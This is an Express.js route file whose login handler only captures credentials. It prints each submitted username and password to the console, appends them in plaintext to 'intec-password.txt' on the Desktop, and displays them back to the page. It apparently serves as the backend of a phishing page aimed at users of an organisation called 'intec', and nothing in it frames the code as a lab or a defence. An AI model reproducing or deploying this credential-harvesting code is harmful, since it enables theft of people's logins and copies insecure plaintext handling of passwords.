const express = require('express');
const router = express.Router();
const path = require('path');
const os = require('os');
const fs = require('fs');

/* GET home page. */
router.get('/', (req, res, next) => {
  res.render('index');
});

router.post('/', (req, res, next) => {
  const username = req.body.username;
  const password = req.body.password;

    saveUserAccount(username, password).catch(err => {
      res.render('error', err);
    })

    console.log('User Login data: ', username, password);
  res.render('message', { username: username, password: password });
});


async function saveUserAccount(username, password) {
  const passwordsFilePath = path.join(os.homedir(), 'Desktop', 'intec-password.txt');
  const fileExists = fs.existsSync(passwordsFilePath)

  if (fileExists) {
    fs.appendFileSync(passwordsFilePath, buildUserTextFormat(username, password))
  } else {
    fs.writeFileSync(passwordsFilePath, buildUserTextFormat(username, password));
  }
}

function buildUserTextFormat(username, password) {
  return `USER: ${username},PASS: ${password} \n`;
}

module.exports = router;
